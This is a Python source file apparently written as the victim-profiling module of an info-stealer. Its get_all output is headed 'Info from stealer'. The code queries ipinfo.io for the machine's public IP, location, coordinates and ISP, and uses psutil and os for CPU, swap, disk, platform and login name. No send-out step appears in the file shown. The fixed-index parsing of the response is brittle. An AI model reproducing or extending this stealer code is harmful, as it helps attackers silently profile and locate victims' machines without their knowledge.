import sys
import os
import io

import requests
import psutil


class GetInfo:
    def __init__(self):
        try:
            self.c = sys.getfilesystemencoding()
            self.s = 'https://ipinfo.io'
            self._content = []
            self.__cut_info(self.__response())
        except:
            pass
        
    
    def __cut_info(self, resp):
        self.data = resp.replace('{', '')
        self.data = self.data.replace('}', '')
        self.data = self.data.replace('"', '')
        self.data = self.data.replace(',', '')
        self.data = self.data.replace('\n', '')
        for item in self.data.split(':'):
            for itm in item.split(' '):
                if itm != '': 
                    self._content.append(itm)
                else:
                    continue      
        return self.data
    

    def __response(self):
        self.resp = requests.get(self.s)
        self.data = io.BytesIO(self.resp.text.encode(self.c))
        self.data.seek(0)
        return self.data.read().decode(self.c)
    
        
    def get_ip(self):
        try:
            return self._content[1]
        except:
            return 'not found'
    
    
    def get_hostname(self):
        return self._content[3]
    
    
    def get_city(self):
        return self._content[5]
    
    
    def get_region(self):
        return self._content[7]
    
    
    def get_country(self):
        return self._content[9]
    
    
    def get_location(self):
        loc1 = self._content[11][:7]
        loc2 = self._content[11][7:]
        return f'{loc1}, {loc2}'
    
    
    def get_isp(self):
        part1 = self._content[13]
        part2 = self._content[14]
        part3 = self._content[15]
        return f'{part1} {part2} {part3}'
    
    
    def get_zip(self):
        return self._content[17]
    
    
    def get_timezone(self):
        return self._content[19]
    
    
    def get_cpu(self):
        return f'{psutil.cpu_count()} x {psutil.cpu_freq()}'
    
    
    def get_orm(self):
        return psutil.swap_memory()
    
    
    def get_disk(self):
        return psutil.disk_io_counters()
    
    
    def get_system(self):
        return sys.platform
    
    
    def get_user(self):
        return os.getlogin()
    
    
    def get_all(self):
        try:
            self.title = \
f'''-----------------------------
Info from stealer
-----------------------------
IP:       {self.get_ip()}
HOST:     {self.get_hostname()}
CITY:     {self.get_city()}
REGION:   {self.get_region()}
COUNTRY:  {self.get_country()}
LOCATE:   {self.get_location()}
ISP:      {self.get_isp()}
ZIP:      {self.get_zip()}
TIMEZONE: {self.get_timezone()}
CPU:      {self.get_cpu()}
ORM:      {self.get_orm()}
SYSTEM:   {self.get_system()}
USER:     {self.get_user()}
'''
            return self.title
        except:
            return 'not found'
    